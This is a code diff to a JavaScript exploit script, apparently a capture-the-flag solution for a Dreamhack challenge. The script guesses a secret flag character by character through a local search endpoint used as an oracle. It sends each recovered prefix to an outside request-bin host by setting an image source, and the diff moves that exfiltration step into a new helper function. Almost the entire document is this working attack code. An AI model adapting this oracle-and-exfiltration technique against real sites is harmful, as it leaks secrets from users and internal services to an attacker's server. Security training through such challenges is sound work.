@@ -15,12 +15,13 @@
             return response.status === 200;
         }
 
-        async function search(query) {
-            try {
-                return await req(`http://127.0.0.1:8000/search?keyword=${query}`);
-            } catch (e) {
-                return false;
+        async function searchAndUpdate(query) {
+            const isFound = await req(`http://127.0.0.1:8000/search?keyword=${query}`);
+            if (isFound) {
+                img.src = `https://oewybdz.request.dreamhack.games/${query}`;
+                return true;
             }
+            return false;
         }
 
         async function exploit() {
@@ -30,9 +31,8 @@
             while (!secret.includes("}")) {
                 let found = false;
                 for (let c of chars) {
-                    if (await search(secret + c)) {
+                    if (await searchAndUpdate(secret + c)) {
                         secret += c;
-                        img.src = `https://kbdohtc.request.dreamhack.games/${secret}`;
                         found = true;
                         break;
                     }
